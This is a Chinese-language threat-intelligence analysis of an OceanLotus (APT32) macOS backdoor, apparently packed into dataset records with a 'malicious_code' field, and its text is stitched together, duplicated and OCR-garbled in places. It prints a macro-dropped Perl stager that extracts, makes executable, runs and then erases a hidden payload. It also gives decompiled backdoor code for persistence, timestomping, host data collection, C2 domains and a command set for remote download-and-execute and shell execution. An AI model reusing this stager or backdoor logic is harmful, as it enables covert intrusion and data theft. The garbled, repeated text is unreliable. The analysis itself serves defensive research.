if (ClientID) free(ClientID); HandlePP::installTime = time(0LL); v7 = malloc(0x7D0uLL); bzero(v7. 0x7D0uLL):  \n\n225 if (!(unsigned _int8)isRoot()) 226 v14 = 72; 227 HandlePP::getOSVersion((HandlePP \\*)&osVersion); 228 HandlePP::getUsername((HandlePP \\*)&userName); 229 HandlePP::getComputerName((HandlePP \\*)&computerName); 230 Arch = HandlePP::getArch((HandlePP \\*)&computerName); 231 v16 = getpid(); 232 std::string::string((std::string \\*)v68, (const std::string \\*)&HandlePP::pathProcess); 233 Parser::Parser((Parser \\*)v67); 234 Parser::inBytes((Parser \\*)v67, &HandlePP::clientID, 0x10u); 235 Parser::inByte((Parser \\*)v67, 0x31u); 236 Parser::inByte((Parser \\*)v67, 0x30u); 237 Parser::inByte((Parser \\*)v67, byte_10001541A); 238 Parser::inByte((Parser \\*)v67, v14); 239 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)osVersion, \\*((_DWORD \\*)osVersion - 6)); 240 Parser::inByte((Parser \\*)v67, 0x74u); 241 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)userName, \\*((_DWORD \\*)userName - 6)); 242 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)computerName, \\*((_DWORD \\*)computerName - 6)); 00000804_2N8HandlePP10infoClientEv:230 (100008084) 00000804_2N8HandlePP10infoClientEv:230 (10000808) 00000804_2N8HandlePP10infoClientEv:230 (100000084) 00000804_2N8HandlePP10infoClientEv:230 (100008084) 00000804_2N8HandlePP10infoClientEv:230 (10  \n\nSTRINGDATA::GET_PATH_INFO方法执行后会解密出一段路径。  \n\n非Root用户路径：  \n\n- /Library/PubSub/Feeds/db.sqlite3  \n\nz6 1 27 v3 = strlen(v2); 28 plain = (char \\*)get_plain((unsigned _int8 \\*)v2, v3, KEY, KEYLENGTH, 1); 29 v5 char \\*plain; // rbx 30 std 0x1003042B0LL:\"~/Library/PubSub/Feeds/db.sqlite3\" 31 if (plain) 32 free(plain); 33 return this; 34 }  \n\nRoot用户路径：  \n\n/Library/Modem Scripts/Motorola BitsURFR 56K.ccl/Contents/Resources/Motorola.rbon.framework/Versions/A/Framework\n\n<--- Page Split --->\n\n*左右滑动查看更多  \n\n![](images/13_0.jpg)\n  \n\n内容为用作识别客户端身份的唯一ID：  \n\n{hep@hepdeMac Feeds % xxd db.sqlite3 00000000: 8ba2 1b12 e0f8 45d8 ca80 a213 e770 7481 ....E......pt. 0000010: c7eb 623d 78ea 561a bea5 7df8 0b26 3d3f .b=x.V...}.&=? hep@hepdeMac Feeds %  \n\n调用hiddenFile / setTimeFile方法隐藏文件，随机化创建时间：  \n\n![](images/13_1.jpg)\n  \n\n加密搜集到的信息：\n\n<--- Page Split --->\n\n230 Arch = HandlePP::getArch((HandlePP *)&computerName); 231 pid = getpid(); 232 std::string::string(std::string *)&v68, (const std::string *)&HandlePP::pathProcess); 233 Parser::Parser((Parser *)v67); 234 Parser::inBytes((Parser *)v67, &HandlePP::clientID, &x1u); 235 Parser::inByte((Parser *)v67, &x31u); 236 Parser::inByte((Parser *)v67, &x3Du); 237 Parser::inByte((Parser *)v67, byte_10001541A); 238 Parser::inByte((Parser *)v67, v14); 239 Parser::inString((Parser *)v67, (unsigned _int8 *)osVersion, *((_DWORD *)osVersion - 6)); 240 Parser::inByte((Parser *)v67, &x74u); 241 Parser::inString((Parser *)v67, (unsigned _int8 *)userName, *((_DWORD *)userName - 6)); 242 Parser::inString((Parser *)v67, (unsigned _int8 *)computerName, *((_DWORD *)computerName - 6)); 243 Parser::inLong((Parser *)v67, HandlePP::installTime); 244 Parser::inByte((Parser *)v67, Arch); 245 Parser::inInt((Parser *)v67, pid); 246 Parser::inString((Parser *)v67, v68, *((_DWORD *)v68 - 6)); 247 Parser::getDataVector((Parser *)v66); 248 std::vector<unsigned char>::vector(v66, v66); 249 Packet::Packet(v61, v60, 7LL, 0LL, 0LL); 250 if (v60[0]) 251 operator delete(v60[0]); 252 v59 = 0; 253 Packet::getArrayBytes((Packet *)v58, (bool *)v61); 254 if (v59) 255 { 256 v23 = 0; 257 goto LABEL_98; 258 }  \n\n获取c2域名ssl.arkouthrie.com。  \n\n37 v3 = strlen(v2); 38 plain = (char *)get_plain((unsigned _int8 *)v2, v3, KEY, KEYLENGTH, 1); 39 v5 = strlen(sslen); 40 std::char *plain; // rbx 41 if (0x100404990LL:\"ssl.arkouthrie.com\" 42 free(plain);  \n\n备用C2域名s3.hiahornber.com。  \n\n37 v3 = strlen(v2); 38 plain = (char *)get_plain((unsigned _int8 *)v2, v3, KEY, KEYLENGTH, 1); 39 v5 = strlen(sslen); 40 std::char *plain; // rbx 41 if (0x100405AB0LL:\"s3.hiahornber.com\" 42 free(plain);  \n\n备用C2域名ssl.arkouthrie.com。  \n\n24 v5 = (unsigned _int8 *)strlen(v3); 25 plain = (char *)get_plain((AES256 *)v3, v5, KEY, KEYLENGTH, 1); 26 v7 = char *plain; // rbx 27 std::0x100307450LL:\"ssl.arkouthrie.com\" 28 if (plain) 29 free(plain); 30 return this;\n\n<--- Page Split --->\n\n拼接请求：  \n\nhttp://ssl.arkouthrie.com/v3/yQ/r/eiCu1gd6Qme.js  \n\n*左右滑动查看更多  \n\n![](images/15_0.jpg)\n  \n\n调用Connector::postHttp发送数据：  \n\n![](images/15_1.jpg)\n  \n\n## 远程控制  \n\nHandlePP::runHandle部分主要功能为请求C2、接收指令并执行：\n\n<--- Page Split --->\n![](images/16_0.jpg)\n  \n\n进入 HandlePP::requestServer 方法。  \n\n解密并拼接请求后，通过 Packet::getCommand 获取控制命令：  \n\n![](images/16_1.jpg)\n  \n\n受控命令功能分析：\n\n<--- Page Split --->\n\n\n<table><tr><td>0x33</td><td>获取文件大小</td></tr><tr><td>0xE8</td><td>退出进程</td></tr><tr><td>0xA2</td><td>远程下载文件并执行</td></tr><tr><td>0xA1</td><td>执行系统命令</td></tr><tr><td>0x48</td><td>删除文件</td></tr><tr><td>0x72</td><td>文件上传</td></tr><tr><td>0x23/0x3C</td><td>文件下载</td></tr></table>  \n\nCommand \\(= = 0x33\\) 获取文件大小  \n\nif（Command \\(= = 0x33\\) ）{ std::vector<unsigned char>::vector(v103,&v130); Converter::Converter(v104,v103); if（v103[0]） operator delete(v103[0]); \\(\\mathrm{v5} = \\mathrm{v104}\\) Converter::outString((Converter \\\\*)&v102); \\(\\mathrm{v31} = \\mathrm{v102}\\) if（\\\\*(_QWORD \\\\*)（v102- 24）） { \\(\\mathrm{v5} = \\mathrm{v104}\\) Converter::outString((Converter \\\\*)&v101); \\(\\mathrm{v32} = \\mathrm{v101}\\) if（\\\\*(_QWORD \\\\*)v101- 3）） { std::string::string((std::string \\\\*)&v100,（const std::string \\\\*)&v101); FileSize \\(=\\) getFileSize((const std::string \\\\*)&v100);//获取文件大小 \\(\\mathrm{v34} = \\mathrm{v100} - 24\\) if（_UNKNOWN \\\\*)（v100- 24） \\(! =\\) &std::string::_Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed int32 \\\\*)（v100- 8),0xFFFFFFFF) \\(< = 0\\) { std::string::_Rep::_M_destroy(v34,v152); } \\(\\mathrm{v35} = 122\\) if（FileSize \\(! = - 1\\) ） \\(\\mathrm{v35} = \\mathrm{0}\\) \\(\\mathrm{v36} = 21\\)\n\n<--- Page Split --->\n\nif（Command \\(= = 0\\times E8\\) ）{ std::vector<unsigned char>::vector(v109,&v130); Converter::Converter(v110,v109); if（v109[0]） operator delete(v109[0]); v5 \\(= v110\\) . Converter::outString((Converter \\\\*)&v108); if（\\\\*（_QWORD\\\\*)（v108- 24）） { std::string::string(std::string \\\\*)&v107,（const std::string \\\\*)&v108); std::vector<unsigned char>::vector(v106,v140); std::string::string(std::string \\\\*)&v105,（const std::string \\\\*)&v128); HandlePP::respondServer((std::string \\\\*)&v107,（_int64)v106,（const std::string \\\\*)&v105); v60 \\(= v105 - 24\\) if（_UNKNOWN\\\\*)（v105- 24） \\(! =\\) &std::string::Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed _int32 \\\\*)（v105- 8),0xFFFFFFFF) \\(< = 0\\) ） { std::string::_Rep::_M_destroy(v60,v152); } if（v106[0]） operator delete(v106[0]); v61 \\(= v107 - 24\\) if（_UNKNOWN\\\\*)（v107- 24） \\(! =\\) &std::string::Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed _int32 \\\\*)（v107- 8),0xFFFFFFFF) \\(< = 0\\) ） { std::string::_Rep::_M_destroy(v61,v152); } exit(0); }  \n\nCommand \\(= = 0\\times \\mathrm{A2}\\) &&Command \\(= = 0\\times \\mathrm{A1}\\)  \n\nif（Command \\(> 0\\times \\mathrm{A1}\\) ） { if（Command \\(= = 0\\times \\mathrm{A2}\\) ） { v29 \\(= 1\\) . v5 \\(=\\) （char \\\\*)&v153; pthread_create(&v84,&v153,respondLoadLunaThread,v44);//远程下载文件并执行 } else { v29 \\(= 1\\) . v5 \\(=\\) （char \\\\*)&v153; pthread_create(&v84,&v153,respondRunTerminalThread,v44);//执行系统命令 } goto LABEL_163; } if（Command \\(> 71\\) ）  \n\nrespondLoadLunaThread线程分析（功能：下载文件并执行）  \n\n如果已执行就删除执行文件。\n\n<--- Page Split --->\n\nv3 = a1 + 3; std::vector<std::string>::push_back(&v33, a1 + 33); if (v2 == 178 && *((_DWORD *)a1 + 6) == 162 ) { if ((unsigned _int8)is_file_exist(_filename) )//判断文件存在 { a1[28] = 36; } else if (!fopen(_filename, \"w\")) { fclose(0LL); } v4 = a1 + 28; if (!a1[28]) { std::string::string((std::string *)&v32, (const std::string *)&_filename); v5 = checkProcessExist(&v32); //判断进程存在 v6 = v32 - 24; if ((_UNKNOWN *)v32 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v32 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v6, v40); } if (v5) { v4 = 126; std::string::string((std::string *)&v31, (const std::string *)&_filename); removeFile(&v31); //删除文件 v7 = v31 - 24; if ((_UNKNOWN *)v31 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v31 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v7, v40); } } } else { v4 = a1 + 28; } } else { if (v29) operator delete(v29); v8 = v30 - 24; if ((_UNKNOWN *)v30 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v30 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v8, v40); } if (*(_DWORD *) (a1 + 29) ) { v4 = 18; }  \n\n未执行就写入磁盘并执行。  \n\nif (!v4) { std::string::string((std::string *)&v30, (const std::string *)&_filename); std::vector<unsigned char>::vector(&v29, v35); *(_DWORD *) (a1 + 29) = HandlePP::loadLuna((std::string *)&v30);//写入并执行文件 if (v29) operator delete(v29); v8 = v30 - 24; if ((_UNKNOWN *) (v30 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v30 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v8, v40); } if (*(_DWORD *) (a1 + 29) ) { v4 = 18; } }  \n\nrespondRunTerminalThread 线程分析（功能：执行系统命令）\n\n<--- Page Split --->\n\n8 std::vector<unsigned char>::vector(v24, a1); 9 Converter::Converter(v25, v24); 0 if (v24[0] ) 1 operator delete(v24[0]); 2 Converter::outString((Converter \\*)&v23); 3 Converter::outString((Converter \\*)&v22); 4 v2 = Converter::outShort((Converter \\*)v25); 5 v21 = (_int64)&std::string::_Rep::_S_empty_rep_storage + 24; 6 std::string::string((std::string \\*)&v20, (const std::string \\*)&v22); 7 \\*(_DWORD \\*)(a1 + 29) = HandlePP::runCommand(&v20, (unsigned int)v2, &v21); 8 v3 = v20 - 24; 9 if ((_UNKNOWN \\*)v20 - 24) != &std::string::_Rep::_S_empty_rep_storage 0 &&_InterlockedExchangeAdd((volatile signed __int32 \\*)v20 - 8), 0xFFFFFFFF) <= 0 ) 1 2 std::string::_Rep::_M_destroy(v3, v26); 3 4 if (\\*(_DWORD \\*)(a1 + 29) ) 5 a1[28] = 18; 6 7  \n\nCommand \\(= = 0\\times 48\\) 删除文件  \n\nif ( Command \\(= = 0\\times 48\\) ) { std::vector<unsigned char>::vector(v82, &v130); Converter::Converter(v83, v82); if ( v82[0] ) operator delete(v82[0]); v5 = v83; Converter::outString((Converter \\*)&v81); v47 = v81; if (\\*(_QWORD \\*)v81 - 3) { v5 = v83; Converter::outString((Converter \\*)&v80); v48 = v80; if (\\*(_QWORD \\*)v80 - 24) { std::string::string((std::string \\*)&v79, (const std::string \\*)&v81); v49 = removefile(&v79); v50 = v79 - 24; if ((_UNKNOWN \\*)v79 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed __int32 \\*)v79 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v50, v152); } if ( v49 ) v51 = 99;  \n\nCommand \\(= = 0\\times 72\\) 文件上传  \n\nif ( Command \\(= = 0\\times 72\\) ) { v29 = 1; v5 = (char \\*)&v153; pthread_create(&v84, &v153, respondUploadThread, v44); goto LABEL_163; }\n\n<--- Page Split --->\n\nCommand \\(= =\\) ox23 || Command \\(= =\\) ox3C文件下载  \n\nelse if ( Command \\(= =\\) ox23 || Command \\(= =\\) ox3C) { v29 = 1; v5 = (char \\\\*)&v153; pthread_create(&v84, &v153, (void \\\\*(_cdecl \\\\*)(void \\\\*))respondownloadThread, v44); goto LABEL_163; } if ( \\\\*v46 ) operator delete(\\*v46);  \n\n04  \n\n关联分析  \n\n根据样本行为特征、C2以及结合开源情报，确定此次攻击活动背后的组织为“海莲花”APT。  \n\n4.1  \n\n宏文档钓鱼  \n\n海莲花经常使用Word宏进行钓鱼攻击，文件普遍为.doc结尾的MHT恶意文档。本次攻击活动样本同样使用.doc结尾带有宏的MHT恶意文档。  \n\n4.2  \n\nC2特征  \n\n在海莲花历史样本（firefox.dmg)中，发现了与本次攻击相同的C2回连URL与本次攻击活动样本相符(/v3/yQ/r/eiCu1gd6Qme.js)。\n\n<--- Page Split --->\n\n## C2服务器  \n\n本次攻击活动样本的C2服务器：  \n\nhttp://ssl.arkouthrie[.]com/appleauth/static/cssj/N252394295/widget/auth/app.csshttp:/  \n\n\\\\*左右滑动查看更多  \n\nIOC:  \n\nHASH:  \n\nSHA256:2BB855DC5D845EB5F2466D7186F150C172DA737BFD9C7F6BC1804E0B8D20F22A (2018- PHIEU GHI DANH THAM DU' TINH HOI HMDC 2018. doc)  \n\nSHA256:4DA8365241C6B028A13B82D852C4F0155EB3D902782C6A538AC007A44A7D61B4 (syslogd)  \n\nSHA256:673ee7a57ba3c5a2384aeb17a66058e59f0a4docddc4f01fe32f369f6a845c8f (screenassistantd / spellagentd)  \n\nC2:  \n\nhttp://ssl.arkouthrie[.]com/appleauth/static/cssj/N252394295/widget/auth/app.css  \n\nhttp://ssl.arkouthrie[.]com/v3/yQ/r/eiCu1gd6Qme.js  \n\n## 一往期回顾  \n\n![](images/22_0.jpg)\n\n\n<--- Page Split --->\n![](images/23_0.jpg)\n  \n\n关于安恒信息安全服务团队  \n\n安恒信息安全服务团队由九维安全能力专家构成，其职责分别为：红队持续突破、橙队擅于赋能、黄队致力建设、绿队跟踪改进、青队快速处置、蓝队实时防御，紫队不断优化、暗队专注情报和研究、白队运营管理，以体系化的安全人才及技术为客户赋能。\n\n<--- Page Split --->\n![](images/24_0.jpg)\n  \n\n收录于合集 #九维技术团队  \n\n140个下一篇九维团队- 青队（处置）|关于github上某免杀loader后门事件的分析\n\n<--- Page Split --->", "format_code": "setStartup();remove(buffer);", "hash_code": "2abd1df22f7b64450f85712916843917d36bcf1df8f15df71e465239aaa0c1af", "hash": "hash"}
{"file_name": "10cad491-31f3-4014-a017-27fa5b03b393_APT32.md", "title": "执行流程图", "malicious_code": "system(\"unzip \". $pathFile . \" -d \". $pathFolderFile);\nsystem(\"chmod +x \\\"\". $pathFolderFile . \"/word/theme/theme0.xml\\\"\");\nmove(\"$pathFolderFile/word/theme/theme0.xml\", \"$pathFolderFile/word/theme/syslogd\");\nsystem(\"\\\"$pathFolderFile/word/theme/syslogd\\\" &\");\nsystem(\"rm -Rf /tmp/system\");\nsystem(\"rm /tmp/modern\");\n\ntouch -t 1407260241 \\\"/Users/hep/Library/Spelling/spellagentd\\\" > /dev/null\n\nstd::string::string((std::string *)&v20, (const std::string *)&v22);\n*(_DWORD *)(a1 + 29) = HandlePP::runCommand(&v20, (unsigned int)v2, &v21);\n\nstd::string::string((std::string *)&v79, (const std::string *)&v81);\nv49 = removefile(&v79);\n\nv29 = 1;\nv5 = (char *)&v153;\npthread_create(&v84, &v153, respondLoadLunaThread, v44);\n\nv29 = 1;\nv5 = (char *)&v153;\npthread_create(&v84, &v153, respondRunTerminalThread, v44);\n\nv29 = 1;\nv5 = (char *)&v153;\npthread_create(&v84, &v153, respondUploadThread, v44);\n\nv29 = 1;\nv5 = (char *)&v153;\npthread_create(&v84, &v153, (void *(*)(void *))respondownloadThread, v44);", "describe": "<--- Page Split --->\n![](images/2_0.jpg)\n  \n\n3- 3  \n\n分析过程  \n\n#### 3.3.1 第一阶段分析  \n\n样本启动后文档内容如下，诱导用户启用宏：\n\n<--- Page Split --->\n![](images/3_0.jpg)\n  \n\n恶意文档首先判断系统版本，如果32位系统会尝试加载\"libc.dylib\"中的导出函数system，用来执行系统命令。如果是64位系统则将文档正文设置为白色，并隐藏文字，伪装成空白文档迷惑受害者。  \n\n![](images/3_1.jpg)\n\n\n<--- Page Split --->\n\n判断系统类型，如果是MacOS系统则继续执行。  \n\nSub Jurvq86PFf2PkeTyWNjv() Dim strString1 As String strString1 = \"\\*Mac\\*\" If Application.system.OperatingSystem Like strString1 Then If Val(Application.Version) < 15 Then fsDcrRr0qMRSMIMmFuWL End If End If End Sub  \n\n将当前文档所在路径拼接进Perl脚本内：  \n\n最后输出的Perl脚本会从文档中解压出themeo.xml文件，添加可执行权限并执行。\n\n<--- Page Split --->\n\n1 #!/usr/bin/perl  2 use File::Copy;  3 $pathFolderFile = \"/tmp/system\";  4 $pathFile = $pathFolderFile . \"/system\";  5 $path = \"/Volumes/\". chr(0x52) . chr(0x3A);  6 $path =~ tr://\\//;mkdir($pathFolderFile);  7 copy($path, $pathFile);  8 system(\"unzip \". $pathFile . \"- d \". $pathFolderFile);  9 system(\"chmod +x \\\"\". $pathFolderFile . \"/word/theme/theme0.xml\\\"\");  10 move(\"$pathFolderFile/word/theme/theme0.xml\", \"$pathFolderFile/word/theme/syslogd\");  11 system(\"\\\"$pathFolderFile/word/theme/syslogd\\\" &\");  12 sleep(1);  13 system(\"rm -Rf /tmp/system\");  14 system(\"rm /tmp/modern\");  15  \n\n#### 3.3.2 第二阶段分析  \n\n文件名：syslogd  \n\nSHA256:4DA8365241C6B028A13B82D852C4F0155EB3D902782C6A538AC007A44A7D61B4SHA1:CE3E827BCC426AEA70447C2D6FF52C2B239DB33EMD5:DA71B64E77AD45BAB56CF71ECD4F55D4  \n\n生成时间：2018- 02- 14 09:58:54 UTC  \n\n## 核心功能实现在setStartup方法内。  \n\n1 int __cdecl main(int argc, const char **argv, const char **envp) {  2 int v3; // eax  3 char buffer[2008]; // [rsp+0h] [rbp- 7F0h] BYREF  4  5 setStartup();  6 v3 = getpid();  7 proc_pidpath(v3, buffer, 0x7D0u);  8 remove(buffer);  9 return 0;  10 }\n\n<--- Page Split --->\n\nisRootUser = isRoot(); GET_PROCESSPATH((std::string \\*)&path, isRootUser);// 解密后门路径 std::string::string(&v64, path, v63); convertPathUser(&v64, __s); v1 = v64 - 24; if ((__UNKNOWN \\*) (v64 - 24) != &MEMORY[0x7FFF870371F0] && __InterlockedExchangeAdd((volatile signed __int32 \\*) (v64 - 8), 0xFFFFFFFF) <= 0) { std::string::_Rep::_M_destroy(v1, v98); } v2 = strlen(__s); std::string::assign((std::string \\*)&path, __s, v2); createFolder(path); GET_PROCESSNAME((std::string \\*)&v62, isRootUser);// 解密进程名 fileName = v62; filePath = appendPathComponent(path, v62); // 拼接路径和进程名 if ((unsigned __int8)Loader::installLoader(filePath, fileName)) { hiddenFile(filePath); // 隐藏文件 setTimeFile(filePath); // 随机修改创建时间 } if (filePath) { free(filePath); } if (isRootUser) { v94 = (char \\*)&MEMORY[0x7FFF870371F0] + 24; if ((unsigned __int8)isRoot()) { n1n - /h-n \\*1n+ n1n/n  \n\n首先会判断是否为Root用户，根据权限将后门文件写入不同的路径中。  \n\nGET_PROCESSPATH方法为解密字符串，样本内所有字符串均使用该方法加密。  \n\n1 std::string \\\\*_fastcall GET_PROCESSPATH(std::string \\\\*this, char a2) 2 unsigned _int8 \\\\*v3; // rdi bool v4; // zf unsigned _int64 v5; // rsi char \\\\*plain; // rbx unsigned _int64 v7; // rax 9 \\\\*(_QWORD \\\\*)this = (char \\\\*)&std::string::_Rep::_S_empty_rep_storage + 24; v3 = \"a0edx0qnx17FJEtC6FpDxQnJt5GHZIBJBsTgiwNisAs\"; v4 = a2 == 0; if (a2) v3 = \"4dH/0ppoS1Wb+VK6IZYxSyuOZm9aG4Jd6ymlask23NG17syz26NLwMznGyITuDw80V5X4Stx958H/Z/Xit5XLKnJ+Am6VhpAgll+JED85pgIn\" \"kks8dVkmDet/Ywx/M\"; v5 = 44LL; if (1v4) v5 = 128LL; plain = (char \\\\*)get_plain(v3, v5, KEY, KEYLENGTH, 1); v7 = strlen(plain); std::string::assign(this, plain, v7); if (plain) free(plain); return this;  \n\n加密方式为AES256，密钥长度20个字节。\n\n<--- Page Split --->\n![](images/7_0.jpg)\n  \n\n解密的硬编码路径为：  \n\n有root权限：  \n\n/Library/CoreMediaIO/Plug- Ins/FCP- DAL/i0SScreenCapture.plugin/Contents/Resources  \n\n左右滑动查看更多\n\n<--- Page Split --->\n![](images/8_0.jpg)\n  \n\n无root权限：  \n\n~/Library/Spelling/  \n\n![](images/8_1.jpg)\n  \n\n解密出进程名：  \n\nRoot用户：screennassistant非Root用户：spellagentd\n\n<--- Page Split --->\n![](images/9_0.jpg)\n  \n\n后门安装方法主要实现在Loader::installLoader内，从自身读取出第三阶段可执行文件，写入磁盘。  \n\n![](images/9_1.jpg)\n\n\n<--- Page Split --->\n\n通过文件头判断出后门为Mach- O可执行文件。  \n\n![](images/10_0.jpg)\n  \n\nsetTimeFile方法会调用系统命令修改文件创建时间，解密出的命令行为：  \n\ntouch - t 1407260241 \\\"/Users/hep/Library/Spelling/spellagentd\\\" > /dev/null  \n\n\\*左右滑动查看更多  \n\n如果当前是root用户，还会解密出路径/Library/LaunchDaemons/，并创建服务文件/Library/LaunchDaemons/com.apple.screen.assistantd.plist  \n\n\\*左右滑动查看更多\n\n<--- Page Split --->\n\nSHA256:673ee7a57ba3c5a2384aeb17a66058e59f0a4d0cddc4f01fe32f369f6a845c8f  \n\nSHA1:91c6ac1f84e2f8a4cf0f8e4d5c8590fc3c1ocf08  \n\nMD5:306d3ed0a7c899b5ef9d0e3c91f05193  \n\n核心功能点在HandlePP::infoClient与HandlePP::runHandle两个方法里，infoClient负责信息搜集，runHandle负责执行C2命令：  \n\n![](images/11_0.jpg)\n  \n\n## 信息搜集  \n\nHandlePP::infoClient方法搜集系统信息，如安装时间、系统版本、用户名、计算机名等，加密后回传C2。\n\n<--- Page Split --->\n\n{ clientID = (_OWORD \\*)HandlePP::getClientID(v5); \\*(_OWORD \\*)&HandlePP::clientID = \\*ClientID; if (ClientID) free(ClientID); HandlePP::installTime = time(0LL); v7 = malloc(0x7D0uLL); bzero(v7. 0x7D0uLL):  \n\n225 if (!(unsigned _int8)isRoot()) 226 v14 = 72; 227 HandlePP::getOSVersion((HandlePP \\*)&osVersion); 228 HandlePP::getUsername((HandlePP \\*)&userName); 229 HandlePP::getComputerName((HandlePP \\*)&computerName); 230 Arch = HandlePP::getArch((HandlePP \\*)&computerName); 231 v16 = getpid(); 232 std::string::string((std::string \\*)v68, (const std::string \\*)&HandlePP::pathProcess); 233 Parser::Parser((Parser \\*)v67); 234 Parser::inBytes((Parser \\*)v67, &HandlePP::clientID, 0x10u); 235 Parser::inByte((Parser \\*)v67, 0x31u); 236 Parser::inByte((Parser \\*)v67, 0x30u); 237 Parser::inByte((Parser \\*)v67, byte_10001541A); 238 Parser::inByte((Parser \\*)v67, v14); 239 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)osVersion, \\*((_DWORD \\*)osVersion - 6)); 240 Parser::inByte((Parser \\*)v67, 0x74u); 241 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)userName, \\*((_DWORD \\*)userName - 6)); 242 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)computerName, \\*((_DWORD \\*)computerName - 6)); 00000804_2N8HandlePP10infoClientEv:230 (100008084) 00000804_2N8HandlePP10infoClientEv:230 (10000808) 00000804_2N8HandlePP10infoClientEv:230 (100000084) 00000804_2N8HandlePP10infoClientEv:230 (100008084) 00000804_2N8HandlePP10infoClientEv:230 (10  \n\nSTRINGDATA::GET_PATH_INFO方法执行后会解密出一段路径。  \n\n非Root用户路径：  \n\n- /Library/PubSub/Feeds/db.sqlite3  \n\nz6 1 27 v3 = strlen(v2); 28 plain = (char \\*)get_plain((unsigned _int8 \\*)v2, v3, KEY, KEYLENGTH, 1); 29 v5 char \\*plain; // rbx 30 std 0x1003042B0LL:\"~/Library/PubSub/Feeds/db.sqlite3\" 31 if (plain) 32 free(plain); 33 return this; 34 }  \n\nRoot用户路径：  \n\n/Library/Modem Scripts/Motorola BitsURFR 56K.ccl/Contents/Resources/Motorola.rbon.framework/Versions/A/Framework\n\n<--- Page Split --->\n\n*左右滑动查看更多  \n\n![](images/13_0.jpg)\n  \n\n内容为用作识别客户端身份的唯一ID：  \n\n{hep@hepdeMac Feeds % xxd db.sqlite3 00000000: 8ba2 1b12 e0f8 45d8 ca80 a213 e770 7481 ....E......pt. 0000010: c7eb 623d 78ea 561a bea5 7df8 0b26 3d3f .b=x.V...}.&=? hep@hepdeMac Feeds %  \n\n调用hiddenFile / setTimeFile方法隐藏文件，随机化创建时间：  \n\n![](images/13_1.jpg)\n  \n\n加密搜集到的信息：\n\n<--- Page Split --->\n\n230 Arch = HandlePP::getArch((HandlePP *)&computerName); 231 pid = getpid(); 232 std::string::string(std::string *)&v68, (const std::string *)&HandlePP::pathProcess); 233 Parser::Parser((Parser *)v67); 234 Parser::inBytes((Parser *)v67, &HandlePP::clientID, &x1u); 235 Parser::inByte((Parser *)v67, &x31u); 236 Parser::inByte((Parser *)v67, &x3Du); 237 Parser::inByte((Parser *)v67, byte_10001541A); 238 Parser::inByte((Parser *)v67, v14); 239 Parser::inString((Parser *)v67, (unsigned _int8 *)osVersion, *((_DWORD *)osVersion - 6)); 240 Parser::inByte((Parser *)v67, &x74u); 241 Parser::inString((Parser *)v67, (unsigned _int8 *)userName, *((_DWORD *)userName - 6)); 242 Parser::inString((Parser *)v67, (unsigned _int8 *)computerName, *((_DWORD *)computerName - 6)); 243 Parser::inLong((Parser *)v67, HandlePP::installTime); 244 Parser::inByte((Parser *)v67, Arch); 245 Parser::inInt((Parser *)v67, pid); 246 Parser::inString((Parser *)v67, v68, *((_DWORD *)v68 - 6)); 247 Parser::getDataVector((Parser *)v66); 248 std::vector<unsigned char>::vector(v66, v66); 249 Packet::Packet(v61, v60, 7LL, 0LL, 0LL); 250 if (v60[0]) 251 operator delete(v60[0]); 252 v59 = 0; 253 Packet::getArrayBytes((Packet *)v58, (bool *)v61); 254 if (v59) 255 { 256 v23 = 0; 257 goto LABEL_98; 258 }  \n\n获取c2域名ssl.arkouthrie.com。  \n\n37 v3 = strlen(v2); 38 plain = (char *)get_plain((unsigned _int8 *)v2, v3, KEY, KEYLENGTH, 1); 39 v5 = strlen(sslen); 40 std::char *plain; // rbx 41 if (0x100404990LL:\"ssl.arkouthrie.com\" 42 free(plain);  \n\n备用C2域名s3.hiahornber.com。  \n\n37 v3 = strlen(v2); 38 plain = (char *)get_plain((unsigned _int8 *)v2, v3, KEY, KEYLENGTH, 1); 39 v5 = strlen(sslen); 40 std::char *plain; // rbx 41 if (0x100405AB0LL:\"s3.hiahornber.com\" 42 free(plain);  \n\n备用C2域名ssl.arkouthrie.com。  \n\n24 v5 = (unsigned _int8 *)strlen(v3); 25 plain = (char *)get_plain((AES256 *)v3, v5, KEY, KEYLENGTH, 1); 26 v7 = char *plain; // rbx 27 std::0x100307450LL:\"ssl.arkouthrie.com\" 28 if (plain) 29 free(plain); 30 return this;\n\n<--- Page Split --->\n\n拼接请求：  \n\nhttp://ssl.arkouthrie.com/v3/yQ/r/eiCu1gd6Qme.js  \n\n*左右滑动查看更多  \n\n![](images/15_0.jpg)\n  \n\n调用Connector::postHttp发送数据：  \n\n![](images/15_1.jpg)\n  \n\n## 远程控制  \n\nHandlePP::runHandle部分主要功能为请求C2、接收指令并执行：\n\n<--- Page Split --->\n![](images/16_0.jpg)\n  \n\n进入 HandlePP::requestServer 方法。  \n\n解密并拼接请求后，通过 Packet::getCommand 获取控制命令：  \n\n![](images/16_1.jpg)\n  \n\n受控命令功能分析：\n\n<--- Page Split --->\n\n\n<table><tr><td>0x33</td><td>获取文件大小</td></tr><tr><td>0xE8</td><td>退出进程</td></tr><tr><td>0xA2</td><td>远程下载文件并执行</td></tr><tr><td>0xA1</td><td>执行系统命令</td></tr><tr><td>0x48</td><td>删除文件</td></tr><tr><td>0x72</td><td>文件上传</td></tr><tr><td>0x23/0x3C</td><td>文件下载</td></tr></table>  \n\nCommand \\(= = 0x33\\) 获取文件大小  